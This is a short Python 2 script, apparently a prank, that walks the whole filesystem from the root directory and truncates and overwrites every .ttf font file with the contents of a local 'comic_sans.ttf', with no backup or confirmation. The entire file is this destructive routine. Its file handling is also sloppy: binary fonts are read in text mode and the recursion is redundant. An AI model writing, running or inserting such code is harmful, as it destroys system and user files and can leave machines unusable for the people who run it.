import os

#for now, let's have it just do .ttfs
font_extensions = [".ttf"]
root_dir = os.path.abspath(os.sep) 

def load_cs(directory=os.getcwd(), file_name="comic_sans.ttf"):
    f = open(os.path.join(directory, file_name), 'r')
    cs = f.read()
    f.close()
    return cs

#this takes in the dump of the font (from load_cs) and 
#the full path of the file to write to.
def write_font(font, file_to_write):
    print "I'm writing: " + file_to_write
    f = open(os.path.realpath(file_to_write), 'r+')
    f.seek(0)
    f.truncate()
    f.close()
    f = open(os.path.realpath(file_to_write), 'r+')
    f.write(font)
    f.close()

def is_font_file(sfile):
    is_font = False
    for ext in font_extensions:
        if(sfile.endswith(ext)):
            is_font = True
    return is_font

def walk_hard(directory, font_file, full_path):
    for root, dirs, files in os.walk(directory):
        for cdir in dirs:
            walk_hard(cdir, font_file, os.path.join(full_path, directory))
        for cfile in files:
            if(is_font_file(cfile)):
                write_font(font_file, os.path.join(os.path.abspath(root), cfile))

if __name__ == '__main__':
    font = load_cs()
    walk_hard(root_dir, font, root_dir)
    
